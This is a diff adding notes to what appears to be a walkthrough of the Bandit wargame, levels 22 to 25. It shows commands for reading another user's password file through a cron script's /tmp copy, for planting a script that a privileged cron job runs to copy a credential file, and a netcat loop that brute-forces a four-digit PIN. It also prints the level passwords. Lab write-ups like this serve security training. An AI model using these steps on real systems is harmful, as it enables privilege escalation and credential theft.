@@ -345,4 +345,96 @@ vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
    
    password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 
-   password: 
+   Run the following commands to check the cron job that is being executed:
+   less /etc/cron.d/cronjob_bandit23
+
+   result:
+   @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+   * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+   Check the cronjob_bandit23.sh file:
+   less /usr/bin/cronjob_bandit23.sh
+   
+   result:
+   #!/bin/bash
+
+   myname=$(whoami)
+   mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+   
+   echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+   cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+   The sh script is putting the password in a file in the /tmp directory and the filename is
+   computed using the logged in user name. We are interested in knowing the password for bandit23
+   so we execute the following command:
+   echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+   result: 8ca319486bfbbc3663ea0fbe81326349
+
+   Now with the file name known we check its contents to find the password:
+
+   Check the file /tmp/8ca319486bfbbc3663ea0fbe81326349
+   result:
+   jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+   password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+** LEVEL_23
+
+   password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+   Check the cronjob getting run as specified in the instructions:
+   #!/bin/bash
+   
+   myname=$(whoami)
+   
+   cd /var/spool/$myname
+   echo "Executing and deleting all scripts in /var/spool/$myname:"
+   for i in * .*;
+   do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+    done
+
+    As we can see the bandit24 user has a cron job that constantly executes scripts in the
+    /var/spool/bendit24 directory if the owner of those scripts is bandit23. So all we have 
+    to do is craete a script to send the bandit24 password to a file of our choosing.
+
+    I created a directory in /tmp: 
+    mkdir /tmp/banditpass24
+    chmod 777 /tmp/banditpass24
+
+    NOTE: It is important to give write privileges to 'world' so that bandit24 can write into this directory
+    
+    Wrote a script, made it executable and copied into the /var/spool/bandit24 directory
+    this was the content of the script:    cp /etc/bandit_pass/bandit24 /tmp/bandit24pass123
+
+    password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+** LEVEL_24
+
+   password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+   We need to write a script to bruteforce the the 4 digit pincode required by the daemon listening on port 30002.
+   #+BEGIN_SRC shell
+     #!/bin/bash
+     pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+     for i in {0000..9999}; do
+         echo "$pass $i" 
+     done | nc localhost 30002
+   #+END_SRC
+
+   password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+** LEVEL_25
+
+   password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+   password:
